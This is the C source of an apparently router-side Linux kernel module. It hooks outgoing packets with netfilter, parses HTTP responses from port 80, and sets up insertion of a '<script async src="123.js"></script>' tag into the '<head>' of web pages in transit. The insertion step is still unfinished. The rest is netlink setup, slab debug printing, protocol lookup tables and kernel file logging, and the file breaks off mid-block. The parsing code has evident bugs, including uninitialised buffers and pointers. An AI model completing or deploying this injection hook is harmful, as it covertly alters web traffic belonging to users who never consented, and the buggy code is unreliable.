#include <asm/io.h>
#include <asm/irq.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/interrupt.h>
#include <linux/mutex.h>

#include <linux/time.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/random.h>
#include <linux/netfilter_bridge.h>
#include <linux/kernel.h>
#include <linux/netlink.h>
#include <net/ip.h>
#include <linux/inetdevice.h>
#include <net/netfilter/nf_conntrack_core.h>
#include <net/genetlink.h>
#include <linux/if_ether.h>
#include <linux/if_pppox.h>
#include <linux/ppp_defs.h>

#include "up.h"

MODULE_AUTHOR("G");
MODULE_VERSION("V0.1");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("up  .  module");

static unsigned int g_up_pid = 0;

/************** up-mode init *******************/
struct genl_family g_up_nl_family = {
    .id         = GENL_ID_GENERATE,
    .name       = "up_module",
    .version    = 1,
    .maxattr    = UP_ATTR_MAX,
};

struct nla_policy up_policy[UP_ATTR_MAX + 1] = {
    [UP_ATTR_TYPE] = { .type = NLA_U8, },
    [UP_ATTR_MAC] = { .type = NLA_U64, },
    [UP_ATTR_SEQUENCE] = { .type = NLA_U64, },

/*
    [UP_ATTR_VAP_NAME] = { .type = NLA_STRING, .len = IFNAMSIZ - 1},
    [UP_ATTR_SIP] = { .type = NLA_U32, },
    [UP_ATTR_DIP] = { .type = NLA_U32, },
    [UP_ATTR_SPORT] = { .type = NLA_U16, },
    [UP_ATTR_DPORT] = { .type = NLA_U16, },
    [UP_ATTR_DPORT] = { .type = NLA_U16, },
    [UP_ATTR_PA_CODE] = { .type = NLA_STRING, .len = 16,},
    [UP_ATTR_PA_HTTP_KEY1] = { .type = NLA_STRING, .len = 512,},
    [UP_ATTR_PA_HTTP_KEY2] = { .type = NLA_STRING, .len = 32,},
    [UP_ATTR_PA_HTTP_KEY3] = { .type = NLA_STRING, .len = 32,},
    [UP_ATTR_PA_HTTP_KEY4] = { .type = NLA_STRING, .len = 256,},
    [UP_ATTR_PA_HTTP_KEY5] = { .type = NLA_STRING, .len = 256,},
    [UP_ATTR_PA_HTTP_KEY6] = { .type = NLA_STRING, .len = 256,},
    [UP_ATTR_PA_HTTP_KEY7] = { .type = NLA_STRING, .len = 256,},
    */
};

//TEST:
int up_report_data(void);

static int
up_set_pid(struct sk_buff *skb, struct genl_info *info)
{
    g_up_pid = info->snd_pid;
    printk("user space PID:%d\n", g_up_pid);

    /*
    msleep(1000);

    printk("report... PID:%d\n", g_up_pid);
    up_report_data();
    */
    return 0;
}

#define UP_OP(_cmd, _func)      \
{                               \
    .cmd    = _cmd,             \
    .policy = up_policy,        \
    .doit   = _func,            \
    .dumpit = NULL,             \
    .flags  = GENL_ADMIN_PERM,  \
}

static struct genl_ops g_up_nl_ops[] = {
    UP_OP(UP_OPS_REPORT_PID, up_set_pid), /* set pid of user process */
};

int up_report_data(void)
{
    int err = 0;
    void *hdr = NULL;
    struct sk_buff *skb = NULL;

    if (g_up_pid == 0) {
        UP_MSG_PRINTF("up pid is still invalid.");
        return -1;
    }

    skb = nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_KERNEL);
    if (NULL == skb) {
        UP_MSG_PRINTF("oom.");
        return -1;
    }

    hdr = genlmsg_put(skb, g_up_pid, 0, &g_up_nl_family, 0, 0);
    if (NULL == hdr) {
        UP_MSG_PRINTF("nlmsg put failed.");
        goto put_err;
    }

    NLA_PUT_U8(skb, UP_ATTR_TYPE, 0xA5);

    genlmsg_end(skb, hdr);

    err = genlmsg_unicast(skb, g_up_pid);
    if (err != 0) {
        UP_MSG_PRINTF("ge nl msg unicast failed.");
        goto put_err;
    }

    UP_MSG_PRINTF("ge nl msg unicast success..");

    return 0;
nla_put_failure:
    UP_MSG_PRINTF("NLA_PUT_ err.");
put_err:
    nlmsg_free(skb);
    skb = NULL;
    return -1;
}


static int up_link_init(void)
{
    int i = 0;
    int err = -1;

    err = genl_register_family(&g_up_nl_family);
    if (err != 0) {
        UP_MSG_PRINTF("genl register family failed.");
        return -1;
    } else {
        UP_MSG_PRINTF("genl register family success.");
    }

    for (i = 0; i < ARRAY_SIZE(g_up_nl_ops); i++) {
        err = genl_register_ops(&g_up_nl_family, &(g_up_nl_ops[i]));
        if (err != 0) {
            UP_MSG_PRINTF("genl register ops failed.");
            goto reg_ops_err;
        }
    }
    UP_MSG_PRINTF("genl register ops success.");
    
    return 0;

reg_ops_err:
    genl_unregister_family(&g_up_nl_family);
    return -1;
}
static void up_link_fini(void)
{
    genl_unregister_family(&g_up_nl_family);
    return;
}

inline char *       
_ip2str (u32 ipv4, char *buf, int buf_len)
{
    snprintf(buf, buf_len, "%d.%d.%d.%d", (ipv4>>24)&0xff, (ipv4>>16)&0xff,     
            (ipv4>>8)&0xff, ipv4&0xff); 
    return buf;
}   

/* 在@src中查找@d 
 * @src可能不是字符串(没有'\0'), 但@d一定要是个字符串(以'\0'结尾)  
 * @max 指定@src的长度。
 * */
char *__strstr2(const char *src, const char *d, int max)
{
    int l2;
    char *s = (char*)src;
    int i = 0;

    l2 = strlen(d);
    if (!l2)
        return (char *)s;
    while(*s && (s - src) <= (max - l2)){
        for(i = 0; i < l2; i ++){
            if(s[i] != d[i])
                break;
        }
        if(i == l2)
            return s;
        s ++;
    }
    return NULL;
}

/* copy @tt中@a之后@b之前的数据到@buf中，返回@b后的地址  
 * 如果@a == NULL:则copy从@tt到@b
 * */
static const char * __get_msg_of_A2B(const char *tt, int tt_len, 
                                        char *buf, int buf_len, 
                                        const char *a,
                                        const char *b)
{
    int len = 0;
    int str_len = 0;
    const char *p = NULL, *p1 = NULL;
    int skip_a_len = 0;
    int skip_b_len = 0;

    if (NULL == tt  || tt_len  <= 0 || 
        NULL == buf || buf_len <= 0 ||
        NULL == b) {
        return NULL;
    }

    if (NULL != a) {
        skip_a_len = strlen(a);
        p = __strstr2(tt, a, tt_len);
    } else {
        a = tt;
        p = tt;
    }
    skip_b_len = strlen(b);

    //p = __strstr2(tt, a, tt_len);
    if (NULL != p) {
        p  += skip_a_len; /* skip "<" */
        len = tt_len - skip_a_len;
        p1 = p;
        p = __strstr2(p1, b, len);
        if (NULL != p) {
            str_len = ((p - p1) >= buf_len) ? (buf_len - 1) : (p - p1);
            strncpy(buf, p1, str_len);
            buf[str_len + 1] = 0;
            return p + skip_b_len; /* skip '>'*/
        }
    }
    return NULL;
}

/* copy @tt中@tt之后@b之前的数据到@buf中，返回@b后的地址  */
static inline const char * __get_msg_of_P2B(const char *tt, int tt_len, 
                                        char *buf, int buf_len, 
                                        const char *b)
{
    return __get_msg_of_A2B(tt, tt_len, buf, buf_len, NULL, b);
}

static inline const char * __get_msg_of_ltgt(const char *tt, int tt_len, char *buf, int buf_len)
{
    return __get_msg_of_A2B(tt, tt_len, buf, buf_len, "<", ">");
}

typedef struct tag_strA2Binfo
{
    const char *strA;
    const char *strB;
    const char *posA;
    const char *posB;
    int A2BLen; /* exclude '\0' */
}STR_A2B_INFO_ST;

/*
 * */

static inline int __get_str_pos_of_A2B(const char *str, int strlen, STR_A2B_INFO_ST *pstStrA2BInfo)
{
    const char *posA = NULL;
    const char *posB = NULL;

    posA = __strstr2(str, pstStrA2BInfo->strA, strlen);
    if (posA == NULL) {
        return -1;
    }

    posB = __strstr2(str, pstStrA2BInfo->strB, strlen);
    if (posB == NULL) {
        return -1;
    }

    pstStrA2BInfo->posA = posA;
    pstStrA2BInfo->posB = posB;

    pstStrA2BInfo->A2BLen = posB - posA;

    return 0;
};

/*
 * @hdr_filed : name of http header-field
 * @pstA2B: output, struct of header-field str
 * */
static inline int _get_http_header_filed(const char *str, 
                                         int strlen, 
                                         const char *hdr_filed, 
                                         STR_A2B_INFO_ST *pstA2B)
{
    pstA2B->strA = hdr_filed;
    pstA2B->strB = "\r\n";

    if (__get_str_pos_of_A2B(str, strlen, pstA2B) < 0) {

        return -1;
    }

    return 0;
}

#define HTTP_RESP_CONTENT_TYPE "Content-Type"

/* find @key in @data
 * @data_len : find range in @data
 * @key      : string want check
 * @key_len  : return the length of key
 * return : begin addr of @key
 * eg:
 *    data : xxxxxxxxxx\r\nContent-Type: text\html\r\nxxxxxxxxxx
 *                         ^                          ^
 *                         a                          b
 *    *key_len = b - a;
 *    return a;
 * */
static char *
up_ct_http_check_key(char *data, int data_len, const char *key, int *key_len)
{
    char *p = NULL, *p1 = NULL;
    int len = 0;

    len = data_len;

    if (data == NULL || data_len <= 0 || key == NULL || key_len == NULL) {
        UP_MSG_PRINTF("invalid args.");
        return NULL;
    }

    /* check content type start */
    p = __strstr2(data, key, len);
    if (p == NULL) {
        UP_MSG_PRINTF("can not find [%s].", key);
        return NULL;
    }

    len -= (p - data);
    p1 = __strstr2(p, "\r\n", len);
    if (p1 == NULL) {
        UP_MSG_PRINTF("invalid [%s].", key);
        return NULL;
    }
    p1 += 2; /* skip "\r\n" */

    *key_len = (p1 - p);

    return p;
}

static int
up_ct_http_response_inject(char * data, int data_len)
{
    char *p = NULL;
    char *http_data     = NULL;
    int   http_data_len = 0;
    char *http_hdr      = NULL;
    char js_str[128];
    char *inject_start  = NULL;
    char *inject_end    = NULL;
    char *key_start     = NULL;
    int   key_len       = 0;
    char *key_end       = NULL;
    

    int js_str_len = 0;

    snprintf(js_str, sizeof(js_str), "%s", "<script async src=\"123.js\"></script>");
    js_str_len = strlen(js_str);

    http_hdr = data;

    /* get http data start */
    p = __strstr2(http_hdr, "\r\n\r\n", data_len);
    if (p == NULL) {
        UP_MSG_PRINTF("find http data failed.");
        return -1;
    }
    http_data = p + 4; /* skip "\r\n\r\n" */
    http_data_len = data_len - (http_data - http_hdr);
    if (http_data_len <= 0) {
        UP_MSG_PRINTF("no http data.");
        return -1;
    }

    /* get <head> in HTML */
    p = __strstr2(http_data, "<head>", http_data_len);
    if (p == NULL) {
        UP_MSG_PRINTF("find <head> failed.");
        return -1;
    }
    inject_start = inject_end = p + 6; /* skip "<head>" */

    key_start = up_ct_http_check_key(data, data_len, "Last-Modified", &key_len);
    if (NULL == key_start) {
        UP_MSG_PRINTF("check failed.");
        return -1;
    }
    UP_MSG_PRINTF("check key len : %d.", key_len);
    key_end = key_start + key_len;

    if (key_len < js_str_len) {
        UP_MSG_PRINTF("keylen is not enougth.");
        return -1;
    }

//xx

    UP_MSG_PRINTF("keylen is enougth.");

    return 0;
}

static int
up_ct_http_response(char *data, int data_len)
{
    int len = 0;
    char *p = NULL, *p1 = NULL;
    STR_A2B_INFO_ST stA2B;
    char buf[128];

    len = data_len;

    /* check content type start */
    memset(&stA2B, 0, sizeof(STR_A2B_INFO_ST));
    if (_get_http_header_filed(data, data_len, HTTP_RESP_CONTENT_TYPE, &stA2B) < 0) {
        UP_MSG_PRINTF("can not find "HTTP_RESP_CONTENT_TYPE".");
        return -1;
    }
    /*
    p = __strstr2(data, HTTP_RESP_CONTENT_TYPE, len);
    if (p == NULL) {
        UP_MSG_PRINTF("can not find Accept.");
        return -1;
    }

    len -= (p - data);
    p1 = __strstr2(p, "\r\n", len);
    if (p == NULL) {
        UP_MSG_PRINTF("invalid Accept.");
        return -1;
    }
    len = p1 - p;
    p = __strstr2(p, "text/html", len);
    if (p == NULL) {
        UP_MSG_PRINTF("http is not text/html.");
        return -1;
    }
    */
    snprintf(buf, (stA2B.A2BLen + 1 >= sizeof(buf) ? sizeof(buf) : stA2B.A2BLen + 1), 
            "%s", buf);
    UP_MSG_PRINTF(HTTP_RESP_CONTENT_TYPE":%s", buf);
    p  = __strstr2(p, "text/html", len);
    p1 = __strstr2(p, "application/x-javascript", len);
    if (p != NULL && p1 != NULL) {
        /* inject */
        return up_ct_http_response_inject(data, data_len);
    }
    /* check content type end */

    UP_MSG_PRINTF("http is not text/html or javascript .");
    return -1;
}

static int 
up_ct_http_get_url(char *data, int data_len)
{
    //char buf[4096];
    //char *b1 = NULL, *b2 = NULL, *b3 = NULL, *b4 = NULL;

    if (NULL == data) {
        return -1;
    }

    if(memcmp(data, "GET", 3) == 0) {
        UP_MSG_PRINTF("%s", "GET");
    } else if(memcmp(data, "POST", 4) == 0) {
        UP_MSG_PRINTF("%s", "POST");
    } else if(memcmp(data, "HTTP", 4) == 0) {
        UP_MSG_PRINTF("%s", "HTTP");
        up_ct_http_response(data, data_len);
    }

    /*
    b1 = __strstr2(data, "\r\n\r\n", data_len);
    if (b1 != NULL) {
        b1 += 4;

        len = data_len - (b1 - data);

        snprintf(buf, len >= 1024 ? 1024 : len, "%s", b1);
        UP_MSG_PRINTF("len:%d\nC:[%s]", len, buf);
    }
    */

    return 0;
}

unsigned int up_ct_http_hook_cb(unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff*))
{
    char buf[1024];
	struct ethhdr  *eh = NULL;
	struct iphdr   *ih = NULL;
	struct tcphdr  *th = NULL;
	struct udphdr  *uh = NULL;
    struct nf_conn *ct = NULL;
	enum ip_conntrack_info ctinfo;
    u16 dport    = 0;
    u16 sport    = 0;
    u8 *pdata    = NULL;
    int len      = 0;
    int data_len = 0;
    __be32 src_ip = 0;
    __be32 dst_ip = 0;

    eh = eth_hdr(skb);
    ih = ip_hdr(skb);

    if (skb->protocol != htons(ETH_P_IP) && skb->protocol != htons(ETH_P_8021Q)){
        return NF_ACCEPT;
    } 

    if (skb->protocol == htons(ETH_P_8021Q) && ih)
        ih = (struct iphdr *)((u8 *)ih+4);

    src_ip = ntohl(ih->saddr);
    dst_ip = ntohl(ih->daddr);

    if(ih->protocol == IPPROTO_TCP){
        th = (struct tcphdr *)((u8 *)ih + (ih->ihl << 2));
        dport = ntohs(th->dest);
        sport = ntohs(th->source);
        /*
    } else if(ih->protocol == IPPROTO_UDP){
        uh = (struct udphdr *)((u8 *)ih + (ih->ihl << 2));
        dport = ntohs(uh->dest);
        sport = ntohs(uh->source);
        */
    } else {
        return NF_ACCEPT;
    }

    /*
    ct = nf_ct_get(skb, &ctinfo);
    if (NULL == ct) {
        return NF_ACCEPT;
    }
    */

    //if (ctinfo == IP_CT_ESTABLISHED) {
    {
        //UP_MSG_PRINTF("----");
        /*
        if (ih->protocol != IPPROTO_TCP) {
            return NF_ACCEPT;
        }
        */
        //len = ih->ihl * 4 + th->doff * 4;
        //pdata = skb->data + len;
        //data_len = ih->tot_len - len;
        int ip_hlen = 0;
        int tcp_len = 0;
        int tcp_hlen = 0;
        //int data_len = 0;

        ip_hlen = ih->ihl << 2;
        tcp_len = ntohs(ih->tot_len) - ip_hlen;
        tcp_hlen = th->doff << 2;
        data_len = tcp_len - tcp_hlen;
        //UP_MSG_PRINTF("tcp_hlen:%d", tcp_hlen);
        pdata = ((u8 *)th) + tcp_hlen;

        if(data_len == 0)
            return NF_ACCEPT;
            
        //if(skb_has_frag_list(skb))                
        if (skb_shinfo(skb)->frag_list != NULL) {                                           
            return NF_ACCEPT;                       
        }                                           

        //UP_MSG_PRINTF("dport:%d sport:%d", dport, sport);
        //if (dport == 80 || sport == 80) {
        if (sport == 80) {
            UP_MSG_PRINTF("dport:%d sport:%d", dport, sport);
            _ip2str(dst_ip, buf, sizeof(buf));
            UP_MSG_PRINTF("dip:%s", buf);
            _ip2str(src_ip, buf, sizeof(buf));
            UP_MSG_PRINTF("sip:%s", buf);
            UP_MSG_PRINTF("data len:%d", data_len);

            //snprintf(buf, sizeof(buf), "%s", pdata);
            //UP_MSG_PRINTF("http data:%s", buf);

            up_ct_http_get_url(pdata, data_len);
        }
        
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops up_hooks[] = {
    {
        .owner    = THIS_MODULE,
        .hooknum  = NF_INET_POST_ROUTING,
        .pf       = PF_INET,
        .priority = NF_IP_PRI_FIRST,
        .hook     = up_ct_http_hook_cb,
    },
};


//80383024
//8033ef0c <cache_chain_mutex>:
//static DEFINE_MUTEX(cache_chain_mutex);
static struct mutex *cache_chain_mutex = NULL;
static struct list_head *cache_chain = NULL;

static void check_irq_off(void)
{
	BUG_ON(!irqs_disabled());
}

static void check_irq_on(void)
{
	BUG_ON(irqs_disabled());
}

/*
 * struct array_cache
 *
 * Purpose:
 * - LIFO ordering, to hand out cache-warm objects from _alloc
 * - reduce the number of linked list operations
 * - reduce spinlock operations
 *
 * The limit is stored in the per-cpu structure to reduce the data cache
 * footprint.
 *
 */
struct array_cache {
	unsigned int avail;
	unsigned int limit;
	unsigned int batchcount;
	unsigned int touched;
	spinlock_t lock;
	void *entry[];	/*
			 * Must have this definition in here for the proper
			 * alignment of array_cache. Also simplifies accessing
			 * the entries.
			 */
};
/*
 * The slab lists for all objects.
 */
struct kmem_list3 {
	struct list_head slabs_partial;	/* partial list first, better asm code */
	struct list_head slabs_full;
	struct list_head slabs_free;
	unsigned long free_objects;
	unsigned int free_limit;
	unsigned int colour_next;	/* Per-node cache coloring */
	spinlock_t list_lock;
	struct array_cache *shared;	/* shared per node */
	struct array_cache **alien;	/* on other nodes */
	unsigned long next_reap;	/* updated without locking */
	int free_touched;		/* updated without locking */
};

typedef unsigned int kmem_bufctl_t;

/*
 * struct slab
 *
 * Manages the objs in a slab. Placed either at the beginning of mem allocated
 * for a slab, or allocated from an general cache.
 * Slabs are chained into three list: fully used, partial, fully free slabs.
 */
struct slab {
	struct list_head list;
	unsigned long colouroff;
	void *s_mem;		/* including colour offset */
	unsigned int inuse;	/* num of objs active in slab */
	kmem_bufctl_t free;
	unsigned short nodeid;
};

static int __s_show(struct kmem_cache *cachep)
{
	//struct kmem_cache *cachep = list_entry(p, struct kmem_cache, next);
	struct slab *slabp;
	unsigned long active_objs;
	unsigned long num_objs;
	unsigned long active_slabs = 0;
	unsigned long num_slabs, free_objects = 0, shared_avail = 0;
	const char *name;
	char *error = NULL;
	int node;
	struct kmem_list3 *l3;

	active_objs = 0;
	num_slabs = 0;
	for_each_online_node(node) {
		l3 = cachep->nodelists[node];
		if (!l3)
			continue;

		check_irq_on();
		spin_lock_irq(&l3->list_lock);

		list_for_each_entry(slabp, &l3->slabs_full, list) {
			if (slabp->inuse != cachep->num && !error)
				error = "slabs_full accounting error";
			active_objs += cachep->num;
			active_slabs++;
		}
		list_for_each_entry(slabp, &l3->slabs_partial, list) {
			if (slabp->inuse == cachep->num && !error)
				error = "slabs_partial inuse accounting error";
			if (!slabp->inuse && !error)
				error = "slabs_partial/inuse accounting error";
			active_objs += slabp->inuse;
			active_slabs++;
		}
		list_for_each_entry(slabp, &l3->slabs_free, list) {
			if (slabp->inuse && !error)
				error = "slabs_free/inuse accounting error";
			num_slabs++;
		}
		free_objects += l3->free_objects;
		if (l3->shared)
			shared_avail += l3->shared->avail;

		spin_unlock_irq(&l3->list_lock);
	}
	num_slabs += active_slabs;
	num_objs = num_slabs * cachep->num;
	if (num_objs - active_objs != free_objects && !error)
		error = "free_objects accounting error";

	name = cachep->name;
	if (error)
		printk(KERN_ERR "slab: cache %s error: %s\n", name, error);

	printk( "%-17s %6lu %6lu %6u %4u %4d",
		   name, active_objs, num_objs, cachep->buffer_size,
		   cachep->num, (1 << cachep->gfporder));
	printk( " : tunables %4u %4u %4u",
		   cachep->limit, cachep->batchcount, cachep->shared);
	printk( " : slabdata %6lu %6lu %6lu",
		   active_slabs, num_slabs, shared_avail);
#define STATS 0
#if STATS
	{			/* list3 stats */
		unsigned long high = cachep->high_mark;
		unsigned long allocs = cachep->num_allocations;
		unsigned long grown = cachep->grown;
		unsigned long reaped = cachep->reaped;
		unsigned long errors = cachep->errors;
		unsigned long max_freeable = cachep->max_freeable;
		unsigned long node_allocs = cachep->node_allocs;
		unsigned long node_frees = cachep->node_frees;
		unsigned long overflows = cachep->node_overflow;

		printk( " : globalstat %7lu %6lu %5lu %4lu \
				%4lu %4lu %4lu %4lu %4lu", allocs, high, grown,
				reaped, errors, max_freeable, node_allocs,
				node_frees, overflows);
	}
	/* cpu stats */
	{
		unsigned long allochit = atomic_read(&cachep->allochit);
		unsigned long allocmiss = atomic_read(&cachep->allocmiss);
		unsigned long freehit = atomic_read(&cachep->freehit);
		unsigned long freemiss = atomic_read(&cachep->freemiss);

		printk( " : cpustat %6lu %6lu %6lu %6lu",
			   allochit, allocmiss, freehit, freemiss);
	}
#endif
	printk("\n\n\n");
	return 0;
}

static inline void *index_to_obj(struct kmem_cache *cache, struct slab *slab,
				 unsigned int idx)
{
	return slab->s_mem + cache->buffer_size * idx;
}

struct prot_str {
    const char *str;
    unsigned  int p;
};

static struct prot_str g_port_strs_list[] = {
    {"ETH_P_LOOP",	0x0060},		/* Ethernet Loopback packet	*/
    {"ETH_P_PUP",     0x0200},		/* Xerox PUP packet		*/
    {"ETH_P_PUPAT", 0x0201},		/* Xerox PUP Addr Trans packet	*/
    {"ETH_P_IP",     0x0800},		/* Internet Protocol packet	*/
    {"ETH_P_X25",     0x0805},		/* CCITT X.25			*/
    {"ETH_P_ARP",     0x0806},		/* Address Resolution packet	*/
    {"ETH_P_BPQ",     0x08FF},		/* G8BPQ AX.25 Ethernet Packet	[ NOT AN OFFICIALLY REGISTERED ID ] */
    {"ETH_P_IEEEPUP",     0x0a00},		/* Xerox IEEE802.3 PUP packet */
    {"ETH_P_IEEEPUPAT", 0x0a01},		/* Xerox IEEE802.3 PUP Addr Trans packet */
    {"ETH_P_DEC",       0x6000},          /* DEC Assigned proto           */
    {"ETH_P_DNA_DL",    0x6001},          /* DEC DNA Dump/Load            */
    {"ETH_P_DNA_RC",    0x6002},          /* DEC DNA Remote Console       */
    {"ETH_P_DNA_RT",    0x6003},          /* DEC DNA Routing              */
    {"ETH_P_LAT",       0x6004},          /* DEC LAT                      */
    {"ETH_P_DIAG",      0x6005},          /* DEC Diagnostics              */
    {"ETH_P_CUST",      0x6006},          /* DEC Customer use             */
    {"ETH_P_SCA",       0x6007},          /* DEC Systems Comms Arch       */
    {"ETH_P_TEB",       0x6558},		/* Trans Ether Bridging		*/
    {"ETH_P_RARP",      0x8035},		/* Reverse Addr Res packet	*/
    {"ETH_P_ATALK", 0x809B	  },  /* Appletalk DDP		*/
    {"ETH_P_AARP", 0x80F3		},/* Appletalk AARP		*/
    {"ETH_P_8021Q", 0x8100      },    /* 802.1Q VLAN Extended Header  */
    {"ETH_P_IPX",     0x8137	},	/* IPX over DIX			*/
    {"ETH_P_IPV6", 0x86DD		},/* IPv6 over bluebook		*/
    {"ETH_P_PAUSE", 0x8808		},/* IEEE Pause frames. See 802.3 31B */
    {"ETH_P_SLOW", 0x8809		},/* Slow Protocol. See 802.3ad 43B */
    {"ETH_P_WCCP", 0x883E		},/* Web-cache coordination protocol
                                   * defined in draft-wilson-wrec-wccp-v2-00.txt */
    {"ETH_P_PPP_DISC", 0x8863},		/* PPPoE discovery messages     */
    {"ETH_P_PPP_SES", 0x8864 },   	/* PPPoE session messages	*/
    {"ETH_P_MPLS_UC", 0x8847 },   	/* MPLS Unicast traffic		*/
    {"ETH_P_MPLS_MC", 0x8848 },   	/* MPLS Multicast traffic	*/
    {"ETH_P_ATMMPOA", 0x884c },   	/* MultiProtocol Over ATM	*/
    {"ETH_P_ATMFATE", 0x8884 },   	/* Frame-based ATM Transport
                                     * over Ethernet
                                     */
    {"ETH_P_PAE",     0x888E},		/* Port Access Entity (IEEE 802.1X) */
    {"ETH_P_AOE",     0x88A2},		/* ATA over Ethernet		*/
    {"ETH_P_TIPC", 0x88CA	},	/* TIPC 			*/
    {"ETH_P_1588", 0x88F7	},	/* IEEE 1588 Timesync */
    {"ETH_P_FCOE", 0x8906	},	/* Fibre Channel over Ethernet  */
    {"ETH_P_FIP",     0x8914},		/* FCoE Initialization Protocol */
    {"ETH_P_EDSA", 0xDADA},		/* Ethertype DSA [ NOT AN OFFICIALLY REGISTERED ID ] */

    /*
     *	Non DIX types. Won't clash for 1500 types.
     */

    {"ETH_P_802_3", 0x0001		},/* Dummy type for 802.3 frames  */
    {"ETH_P_AX25", 0x0002		},/* Dummy protocol id for AX.25  */
    {"ETH_P_ALL",     0x0003	},	/* Every packet (be careful!!!) */
    {"ETH_P_802_2", 0x0004		},/* 802.2 frames 		*/
    {"ETH_P_SNAP", 0x0005		},/* Internal only		*/
    {"ETH_P_DDCMP",     0x0006  },        /* DEC DDCMP: Internal only     */
    {"ETH_P_WAN_PPP",   0x0007   },       /* Dummy type for WAN PPP frames*/
    {"ETH_P_PPP_MP",    0x0008   },       /* Dummy type for PPP MP frames */
    {"ETH_P_LOCALTALK", 0x0009	 },   /* Localtalk pseudo type 	*/
    {"ETH_P_CAN",       0x000C	 },   /* Controller Area Network      */
    {"ETH_P_PPPTALK",     0x0010 },   	/* Dummy type for Atalk over PPP*/
    {"ETH_P_TR_802_2", 0x0011	 },   /* 802.2 frames 		*/
    {"ETH_P_MOBITEX", 0x0015},		/* Mobitex (kaz@cafe.net)	*/
    {"ETH_P_CONTROL", 0x0016},		/* Card specific control frames */
    {"ETH_P_IRDA", 0x0017	},	/* Linux-IrDA			*/
    {"ETH_P_ECONET", 0x0018	},	/* Acorn Econet			*/
    {"ETH_P_HDLC", 0x0019	},	/* HDLC frames			*/
    {"ETH_P_ARCNET", 0x001A	},	/* 1A for ArcNet :-)            */
    {"ETH_P_DSA",     0x001B},		/* Distributed Switch Arch.	*/
    {"ETH_P_TRAILER", 0x001C},		/* Trailer switch tagging	*/
    {"ETH_P_PHONET", 0x00F5},		/* Nokia Phonet frames          */
    {"ETH_P_IEEE802154", 0x00F6},		/* IEEE802.15.4 frame		*/
};

#define IEEE80211_FC0_VERSION_MASK          0x03
#define IEEE80211_FC0_VERSION_SHIFT         0
#define IEEE80211_FC0_VERSION_0             0x00
#define IEEE80211_FC0_TYPE_MASK             0x0c
#define IEEE80211_FC0_TYPE_SHIFT            2
#define IEEE80211_FC0_TYPE_MGT              0x00
#define IEEE80211_FC0_TYPE_CTL              0x04
#define IEEE80211_FC0_TYPE_DATA             0x08

#define IEEE80211_FC0_SUBTYPE_MASK          0xf0
#define IEEE80211_FC0_SUBTYPE_SHIFT         4
/* for TYPE_MGT */
static struct prot_str g_prot_str_list_w_mgt[] = {
    {"ASSOC_REQ     ",0x00},
    {"ASSOC_RESP    ",0x10},
    {"REASSOC_REQ   ",0x20},
    {"REASSOC_RESP  ",0x30},
    {"PROBE_REQ     ",0x40},
    {"PROBE_RESP    ",0x50},
    {"BEACON        ",0x80},
    {"ATIM          ",0x90},
    {"DISASSOC      ",0xa0},
    {"AUTH          ",0xb0},
    {"DEAUTH        ",0xc0},
    {"ACTION        ",0xd0},
    {"ACTION_NO_ACK ",0xe0},
};                     
/* for TYPE_CTL */   
static struct prot_str g_prot_str_list_w_ctl[] = {
    {"Control_Wrapper",   0x70},    // For TxBF RC
    {"BAR           ",0x80},
    {"PS_POLL       ",0xa0},
    {"RTS           ",0xb0},
    {"CTS           ",0xc0},
    {"ACK           ",0xd0},
    {"CF_END        ",0xe0},
    {"CF_END_ACK    ",0xf0},
};                   
/* for TYPE_DATA (bit combination) */
static struct prot_str g_prot_str_list_w_data[] = {
    {"DATA          ",0x00},
    {"CF_ACK        ",0x10},
    {"CF_POLL       ",0x20},
    {"CF_ACPL       ",0x30},
    {"NODATA        ",0x40},
    {"CFACK         ",0x50},
    {"CFPOLL        ",0x60},
    {"CF_ACK_CF_ACK ",0x70},
    {"QOS           ",0x80},
    {"QOS_NULL      ",0xc0},
};
/*
 * generic definitions for IEEE 802.11 frames
 */
struct ieee80211_frame {
    u_int8_t    i_fc[2];
    u_int8_t    i_dur[2];
    #define IEEE80211_ADDR_LEN      6
    u_int8_t    i_addr1[IEEE80211_ADDR_LEN];
    u_int8_t    i_addr2[IEEE80211_ADDR_LEN];
    u_int8_t    i_addr3[IEEE80211_ADDR_LEN];
    u_int8_t    i_seq[2];
    /* possibly followed by addr4[IEEE80211_ADDR_LEN]; */
    /* see below */
} __packed;

static struct file *g_log_fp = NULL;

struct log_file 
{
    char file_path[128];
    struct file *fp;
    loff_t pos;
};

static struct file* s_open_file(struct log_file *lf)
{
   struct file *fp = NULL; 

   fp = filp_open(lf->file_path, O_RDWR | O_CREAT, 0644);
   if (IS_ERR(fp)) {
       printk("[%s][%d]file[%s] open failed\n", __func__, __LINE__, lf->file_path);
       return NULL;
   }

   lf->fp = fp;

   return fp;
};

static void s_close_file(struct log_file *lf)
{
    if (lf->fp) {
        filp_close(lf->fp, NULL);
        lf->fp = NULL;
        lf->pos = 0;
    }

    return;
}

//static int s_write_2_file(struct file *fp, char *buf, int buf_len, loff_t pos)
static int s_write_2_file(struct log_file *lf, char *buf, int buf_len)
{
    mm_segment_t fs;
    
    fs = get_fs();
    set_fs(KERNEL_DS);

    vfs_write(lf->fp, buf, buf_len, &(lf->pos));
    //lf->fp->f_op->write(lf->fp, buf, buf_len, &(lf->fp->f_pos));

    set_fs(fs);

    //lf->pos += buf_len;

    return 0;
}

#if 0
static int __s_show_known_skb(struct sk_buff *skb, int *fp_pos, int *_cnt)
{
    int pi  = 0;
    int pos = *fp_pos;
    int buf_len = 0;
    char buf[4096];
    int cnt = *_cnt;
	struct ethhdr  *eh = NULL;

    for (pi = 0; pi < ARRAY_SIZE(g_port_strs_list); pi++) {
        if (skb->protocol == htons(g_port_strs_list[pi].p)) {
            //printk("KNOWN[%d] skb p:%s\n", cnt, g_port_strs_list[pi].str);
            if (skb->protocol == htons(ETH_P_IP)) {
                eh = eth_hdr(skb);
                buf_len = snprintf(buf, sizeof(buf),"%4d:%s:\tSRC:"MAC_FMT"\tDEST:"MAC_FMT"\n", 
                        cnt, g_port_strs_list[pi].str, 
                        MAC2STR(eh->h_source), 
                        MAC2STR(eh->h_dest));
                pos = s_write_2_file(g_log_fp, buf, buf_len, pos);
                return 1;
            }

